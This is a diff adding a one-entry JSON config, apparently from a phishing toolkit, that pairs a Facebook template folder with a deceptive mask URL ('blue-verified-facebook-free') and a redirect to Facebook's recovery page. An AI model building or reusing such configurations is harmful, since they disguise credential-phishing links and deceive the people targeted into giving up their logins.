@@ -1,0 +1,9 @@
+[
+  {
+    "name": "Facebook",
+    "choice": "1",
+    "folder": "facebook",
+    "mask": "https://blue-verified-facebook-free",
+    "redirect": "https://facebook.com/recover/initiate/"
+  }
+]
